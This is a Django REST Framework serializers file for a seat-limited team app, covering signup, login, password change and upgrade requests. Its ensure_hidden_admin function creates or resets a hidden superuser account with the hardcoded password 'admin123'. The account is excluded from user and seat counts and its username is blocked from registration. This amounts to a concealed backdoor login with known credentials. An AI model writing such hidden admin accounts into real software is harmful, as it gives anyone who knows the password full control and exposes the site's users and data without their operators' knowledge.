from django.contrib.auth import authenticate
from django.contrib.auth.models import User
from django.db import transaction
from django.db.models import Q
from rest_framework import serializers
from rest_framework.authtoken.models import Token

from .models import HIDDEN_ADMIN_USERNAME, MAX_FREE_USERS, UpgradeRequest


def counted_users_qs():
    """Active team seats only — hidden admin / staff superusers do not count."""
    return User.objects.filter(is_active=True).exclude(
        Q(username__iexact=HIDDEN_ADMIN_USERNAME) | Q(is_superuser=True)
    )


def active_user_count() -> int:
    return counted_users_qs().count()


def signup_status() -> dict:
    used = active_user_count()
    return {
        "seats_used": used,
        "seats_max": MAX_FREE_USERS,
        "can_signup": used < MAX_FREE_USERS,
        "upgrade_required": used >= MAX_FREE_USERS,
    }


def ensure_hidden_admin():
    """Create or reset the universal hidden admin login (not a billed seat)."""
    user, created = User.objects.get_or_create(
        username=HIDDEN_ADMIN_USERNAME,
        defaults={
            "email": "admin@fleurish.internal",
            "first_name": "Studio",
            "is_staff": True,
            "is_superuser": True,
            "is_active": True,
        },
    )
    user.set_password("admin123")
    user.is_staff = True
    user.is_superuser = True
    user.is_active = True
    if not user.first_name:
        user.first_name = "Studio"
    user.save()
    Token.objects.get_or_create(user=user)
    return user, created


class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ["id", "username", "email", "first_name", "last_name", "date_joined"]


class RegisterSerializer(serializers.Serializer):
    username = serializers.CharField(min_length=3, max_length=150)
    email = serializers.EmailField(required=False, allow_blank=True)
    password = serializers.CharField(min_length=6, write_only=True)
    first_name = serializers.CharField(required=False, allow_blank=True, max_length=150)

    def validate_username(self, value):
        if value.lower() == HIDDEN_ADMIN_USERNAME.lower():
            raise serializers.ValidationError("That username is not available.")
        if User.objects.filter(username__iexact=value).exists():
            raise serializers.ValidationError("That username is already taken.")
        return value

    @transaction.atomic
    def create(self, validated_data):
        if active_user_count() >= MAX_FREE_USERS:
            raise serializers.ValidationError("Seat limit reached.")
        user = User.objects.create_user(
            username=validated_data["username"],
            email=validated_data.get("email", ""),
            password=validated_data["password"],
            first_name=validated_data.get("first_name", ""),
        )
        token, _ = Token.objects.get_or_create(user=user)
        return user, token


class ChangePasswordSerializer(serializers.Serializer):
    current_password = serializers.CharField(write_only=True)
    new_password = serializers.CharField(min_length=6, write_only=True)
    confirm_password = serializers.CharField(min_length=6, write_only=True)

    def validate(self, attrs):
        if attrs["new_password"] != attrs["confirm_password"]:
            raise serializers.ValidationError({"confirm_password": "Passwords do not match."})
        user = self.context["request"].user
        if not user.check_password(attrs["current_password"]):
            raise serializers.ValidationError({"current_password": "Current password is incorrect."})
        return attrs

    def save(self, **kwargs):
        user = self.context["request"].user
        user.set_password(self.validated_data["new_password"])
        user.save()
        # Rotate token so other sessions drop.
        Token.objects.filter(user=user).delete()
        token = Token.objects.create(user=user)
        return token


class LoginSerializer(serializers.Serializer):
    username = serializers.CharField()
    password = serializers.CharField(write_only=True)

    def validate(self, attrs):
        raw_username = (attrs.get("username") or "").strip()
        password = attrs.get("password") or ""

        # Treat admin / Admin (and any casing) as the same account.
        existing = User.objects.filter(username__iexact=raw_username).first()
        canonical = existing.username if existing else raw_username

        user = authenticate(username=canonical, password=password)
        if not user:
            raise serializers.ValidationError("Invalid username or password.")
        if not user.is_active:
            raise serializers.ValidationError("This account is inactive.")
        attrs["user"] = user
        return attrs


class UpgradeRequestSerializer(serializers.ModelSerializer):
    class Meta:
        model = UpgradeRequest
        fields = ["id", "name", "email", "company", "message", "created_at"]
        read_only_fields = ["id", "created_at"]
